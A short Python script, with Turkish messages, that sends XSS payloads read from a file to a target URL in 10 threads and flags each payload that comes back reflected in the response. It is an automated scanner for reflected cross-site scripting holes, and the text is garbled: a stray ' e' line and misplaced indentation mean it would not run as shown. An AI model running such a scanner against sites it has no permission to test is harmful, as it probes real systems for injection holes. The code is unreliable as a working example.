import requests
import threading
import queue

 
url_template = "http://hedefsite.com/ara?param={}"

 
payload_queue = queue.Queue()

 e
with open("xss_payloads.txt", "r", encoding="utf-8") as file:
    for line in file:
        payload = line.strip()
        if payload:  
            payload_queue.put(payload)

def worker():
    while not payload_queue.empty():
        payload = payload_queue.get()
         url = url_template.format(payload)
        try:
            response = requests.get(url, timeout=5)
             if payload in response.text:
                 print(f"\033[92m[+] Potansiyel XSS açığı: '{payload}' yansıtılmış.\033[0m")
            else:
                print(f"[-] '{payload}' yansıtılmamış.")
        except Exception as e:
            print(f"[!] '{payload}' gönderilirken hata: {e}")
        finally:
            payload_queue.task_done()

 num_threads = 10
threads = []

for i in range(num_threads):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

 payload_queue.join()

 for t in threads:
    t.join()

print("Tüm payload'lar test edildi.")
